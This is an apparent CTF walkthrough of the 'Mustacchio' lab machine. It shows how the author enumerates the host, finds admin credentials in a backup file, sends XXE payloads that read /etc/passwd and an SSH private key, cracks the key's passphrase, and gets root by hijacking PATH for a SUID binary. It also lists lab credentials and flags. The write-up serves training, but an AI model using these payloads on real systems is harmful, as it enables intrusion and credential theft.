# Mustacchio

### IP-10.10.19.105  Difficulty: Easy

Started a nmap scan for the IP and got 3 open ports:

```
22 : SSH
80 : HTTP
8765: HTTP
```

In the gobuster scan on port 80, got a directory /custom with /js and /css directories. In /js, found users.bak file.
Downloaded it and opened the file. I contains admin credentials to the port 8765 site.

```
admin:bulldog19
```

Logged into the website and found that It was asking for XML code to run.
In the page source I found that there is a file /auth/dontforget.bak.

Downloaded it and it was a sample of a XML code with three comments i.e. name, author and com. Which means the XML code must contain these three comments.

So to access /etc/passwd file, I found this code:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>
```

It ran successfully.

Now in the page source it was mentioned that barry can have his ssh key using XML. So to get his id_rsa:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>
```

Copied it in a file and changed its permissions to 400 by chmod.
It was an encrypted rsa file so I changed the rsa using ssh2john.py and used john to get password for ssh key.

```
passphrase: urieljames
```

Then I sshed into the server using this key and password.

Got the user.txt.

```
user.txt: 62d77a4d5f97d47c5aa38b3b2651b831
```

In the /home/joe, there was a SUID file which we can run as root.
I found out that it was using tail to print out something but without absolute path. So it is vulnerable to path variable attack.

Created a file named tail in /tmp with following conten:

```
chmod +s /bin/bash
```

And made it executable. Added /tmp into the PATH enviornment variable.

And on running the executable file in /home/joe, it successfully changed the permissions of /bin/bash.

Simply ran /bin/bash -p and got root.

```
root.txt: 3223581420d906c4dd1a5f9b530393a5
```
